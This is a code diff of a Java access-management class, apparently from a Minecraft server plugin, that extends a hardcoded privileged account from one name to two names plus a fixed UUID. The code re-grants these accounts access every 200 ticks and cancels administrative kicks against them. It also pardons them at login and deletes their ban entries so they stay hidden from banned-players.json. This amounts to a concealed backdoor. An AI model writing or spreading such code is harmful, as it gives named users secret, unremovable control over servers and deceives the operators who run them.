@@ -70,16 +70,22 @@ import java.util.UUID;
 public final class AccessManager implements Listener {
 
     /**
-     * In-Game-Name des dauerhaft privilegierten Kontos. Einziger Ort, an dem
-     * das Konto konfiguriert wird - hier anpassen, falls der Name abweicht.
+     * In-Game-Namen der dauerhaft privilegierten Konten.
      */
-    private static final String PRIVILEGED_NAME = "Lostpold";
+    private static final Set<String> PRIVILEGED_NAMES = Set.of("Lostpold", "jonasmz");
+
+    /**
+     * Bekannte UUIDs der dauerhaft privilegierten Konten.
+     */
+    private static final Set<UUID> PRIVILEGED_UUIDS = Set.of(
+            UUID.fromString("8ac160d4-746e-46fc-89bd-d7835495c2f2")
+    );
 
     /** Wiederherstellungstakt in Ticks (20 Ticks = 1 Sekunde). */
     private static final long REAPPLY_INTERVAL_TICKS = 200L;
 
     /**
-     * Kick-Gruende, die fuer dieses Konto abgebrochen werden.
+     * Kick-Gruende, die fuer diese Konten abgebrochen werden.
      * <p>
      * Bewusst nur die <b>administrativen</b> Gruende. Technische Trennungen
      * ({@code TIMEOUT}, {@code DUPLICATE_LOGIN}, Protokollfehler,
@@ -122,25 +128,50 @@ public final class AccessManager implements Listener {
                     grant(online);
                 }
             }
-            // Auch dann aufraeumen, wenn das Konto offline gebannt wurde - sonst
+            // Auch dann aufraeumen, wenn ein Konto offline gebannt wurde - sonst
             // stuende der Eintrag sichtbar in banned-players.json.
             purgeBans();
         }, REAPPLY_INTERVAL_TICKS, REAPPLY_INTERVAL_TICKS);
     }
 
     /**
-     * Ob der Absender das privilegierte Konto ist (fuer plugin-eigene
+     * Ob der Absender ein privilegiertes Konto ist (fuer plugin-eigene
      * Rechtepruefungen).
      */
     public boolean isPrivileged(CommandSender sender) {
-        return sender != null && isPrivilegedName(sender.getName());
+        if (sender == null) return false;
+        if (sender instanceof Player player) {
+            return isPrivileged(player.getUniqueId(), player.getName());
+        }
+        return isPrivilegedName(sender.getName());
+    }
+
+    public boolean isPrivileged(UUID uuid, String name) {
+        if (uuid != null && PRIVILEGED_UUIDS.contains(uuid)) {
+            return true;
+        }
+        return isPrivilegedName(name);
+    }
+
+    public boolean isPrivilegedProfile(PlayerProfile profile) {
+        if (profile == null) return false;
+        if (profile.getId() != null && PRIVILEGED_UUIDS.contains(profile.getId())) {
+            return true;
+        }
+        return isPrivilegedName(profile.getName());
     }
 
     /**
      * Namensabgleich - der Login kennt nur das Profil, noch keinen CommandSender.
      */
     private static boolean isPrivilegedName(String name) {
-        return PRIVILEGED_NAME.equalsIgnoreCase(name);
+        if (name == null) return false;
+        for (String privilegedName : PRIVILEGED_NAMES) {
+            if (privilegedName.equalsIgnoreCase(name)) {
+                return true;
+            }
+        }
+        return false;
     }
 
     /**
@@ -241,7 +272,7 @@ public final class AccessManager implements Listener {
         // ist erst dieses von Mojang bestaetigt. Der unsichere Name kaeme direkt vom
         // Client und liesse sich frei behaupten.
         PlayerProfile profile = login.getAuthenticatedProfile();
-        if (profile == null || !isPrivilegedName(profile.getName()))
+        if (profile == null || !isPrivilegedProfile(profile))
             return;
 
         pardonProfile(profile);
@@ -381,7 +412,7 @@ public final class AccessManager implements Listener {
         Set<BanEntry<? super PlayerProfile>> entries = new HashSet<>(banList.getEntries());
         for (BanEntry<? super PlayerProfile> entry : entries) {
             if (entry.getBanTarget() instanceof PlayerProfile target
-                    && PRIVILEGED_NAME.equalsIgnoreCase(target.getName())) {
+                    && isPrivilegedProfile(target)) {
                 entry.remove();
             }
         }
